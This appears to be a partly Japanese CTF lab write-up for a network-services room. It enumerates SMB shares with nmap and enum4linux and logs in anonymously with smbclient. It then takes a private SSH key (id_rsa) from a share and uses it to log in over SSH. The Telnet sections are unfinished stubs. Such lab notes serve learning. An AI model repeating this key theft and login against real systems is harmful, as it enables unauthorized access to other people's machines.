# Network Service

## Task2 Understainding SMB

## Task3 Enumerating SMB

```bash
root@ip-10-10-70-8:~# nmap 10.10.111.169

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-29 08:28 BST
Nmap scan report for ip-10-10-111-169.eu-west-1.compute.internal (10.10.111.169)
Host is up (0.00094s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:23:D6:CB:05:51 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds
```

```bash
enum4linux 10.10.111.169
enum4linux -S 10.10.111.169
```

```bash
========================================== 
|    Share Enumeration on 10.10.111.169    |
 ========================================== 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      Network Logon Service
	profiles        Disk      Users profiles
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
```

## Task 4 Exploiting SMB

smbclientがsambaに標準装備されており利用できる。

```bash
smbclient //[IP]/[SHARE]
-U [name] : to specify the user
-p [port] : to specify the port
```

* 途中で空白が入ったファイルを開く場合は、ダブルクオーテーションで囲んであげる必要がある。
* smbクライアントの対話型シェルで、get <ファイル名>とすることで接続元にファイル転送が可能である
  
```bash
root@ip-10-10-140-19:/home/root# ls
root@ip-10-10-140-19:/home/root# smbclient //10.10.111.169/profiles -U anonymous -p 445
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> get "Working From Home Information.txt" 
getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (116.5 KiloBytes/sec) (average 116.5 KiloBytes/sec)
smb: \> exit
root@ip-10-10-140-19:/home/root# ls
'Working From Home Information.txt'
root@ip-10-10-140-19:/home/root# cat "Working\ From\ Home\ Information.txt" 
cat: 'Working\ From\ Home\ Information.txt': No such file or directory
root@ip-10-10-140-19:/home/root# cat 'Working From Home Information.txt' 
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager
```

事前にSBMで get .ssh/id_rsaしてくる。

```bash
root@ip-10-10-46-160:~# ls
Desktop    id_rsa        Pictures  Rooms    thinclient_drives
Downloads  Instructions  Postman   Scripts  Tools
root@ip-10-10-46-160:~# chmod 600 id_rsa 
root@ip-10-10-46-160:~# ssh -i id_rsa cactus@10.10.29.85
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 29 13:15:08 UTC 2022

  System load:  0.04               Processes:           93
  Usage of /:   33.3% of 11.75GB   Users logged in:     0
  Memory usage: 19%                IP address for eth0: 10.10.29.85
  Swap usage:   0%


22 packages can be updated.
0 updates are security updates.


Last login: Sun May 29 13:14:33 2022 from 10.10.46.160
```

## Task5 Understanding Telnet

```bash
telnet [ip] [port]
```

* 接続先のサーバーがtelnetサーバである必要あり
* メッセージを平文で送るためSSHにとって変わられている

* application protcol
* encryptionがない

## Task6 Ennumerating Telnet

